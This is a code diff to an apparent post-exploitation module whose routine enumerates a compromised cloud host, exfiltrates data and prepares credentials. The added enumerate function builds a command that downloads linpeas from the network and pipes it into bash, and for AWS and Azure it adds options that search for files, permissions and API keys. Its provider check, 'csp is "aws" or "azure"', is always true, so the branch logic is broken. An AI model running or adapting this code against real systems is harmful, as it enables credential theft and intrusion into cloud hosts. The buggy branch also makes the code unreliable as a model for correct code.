@@ -86,7 +86,7 @@ class Module(BaseModule):
 
             def enum_exfil_prep_creds(csp, task_name):
                 session.log("running enumerate...")
-                enumerate()
+                enumerate(csp)
                 session.log("enumerate complete")
                 session.log("running exfiltrate...")
                 exfiltrate(csp)
@@ -95,7 +95,18 @@ class Module(BaseModule):
                 prep_local_env(csp=csp, task_name=task_name)
                 session.log("prep_local_env complete")
 
-            def enumerate(command="curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information | tee /tmp/linpeas.txt"):
+            def enumerate(csp="aws"):
+                extensive = "system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                limited = "system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information"
+
+                if csp is "aws" or "azure":
+                    opts = extensive
+                else:
+                    # gcp sessions timeout with extensive
+                    opts = limited
+
+                command = f"curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o {opts} | tee /tmp/linpeas.txt"
+
                 # create a wait and retry payload
                 payload = retry_command(command=command)
 
